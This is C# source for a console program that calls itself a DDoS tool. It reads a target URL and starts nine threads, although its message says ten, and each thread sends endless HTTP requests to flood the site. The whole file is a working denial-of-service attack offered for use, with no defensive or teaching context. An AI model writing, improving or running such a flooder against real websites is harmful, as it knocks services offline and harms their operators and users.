using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net.Http.Headers;
using System.IO;
using System.Net;
using System.Threading;

namespace CSharpDDOS
{
    internal class Program
    {
        public static string html = string.Empty;
        public static string url = string.Empty;
        private static void Main()
        {
            Console.Title = "C# DDOS Tool by Vichingo455";
            Console.WriteLine("Welcome, please type the URL to do a DDoS attack.");
            url = Console.ReadLine();
            //Handle invalid URL cases
            if (url == string.Empty) 
            {
                Console.WriteLine("URL cannot be empty.");
                Console.ReadKey();
                Environment.Exit(-1);
            }
            else if (!url.StartsWith("http://") && !url.StartsWith("https://")) 
            {
                Console.WriteLine("The specified URL is not valid.");
                Console.ReadKey();
                Environment.Exit(-1);
            }
            Console.WriteLine("Using 10 threads, stop with CTRL+C...");
            Thread thr = new Thread(DDOS);
            thr.Start();
            Thread thr2 = new Thread(DDOS);
            thr2.Start();
            Thread thr3 = new Thread(DDOS);
            thr3.Start();
            Thread thr4 = new Thread(DDOS);
            thr4.Start();
            Thread thr5 = new Thread(DDOS);
            thr5.Start();
            Thread thr6 = new Thread(DDOS);
            thr6.Start();
            Thread thr7 = new Thread(DDOS);
            thr7.Start();
            Thread thr8 = new Thread(DDOS);
            thr8.Start();
            Thread thr9 = new Thread(DDOS);
            thr9.Start();
        }
        private static void DDOS()
        {
            for (; ;)
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.AutomaticDecompression = DecompressionMethods.GZip;
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    html = reader.ReadToEnd();
                }
                if (!string.IsNullOrEmpty(html))
                {
                    Console.WriteLine("Request sent.");
                }
                else
                {
                    Console.WriteLine("Request not sent.");
                }
            }
        }
    }
}
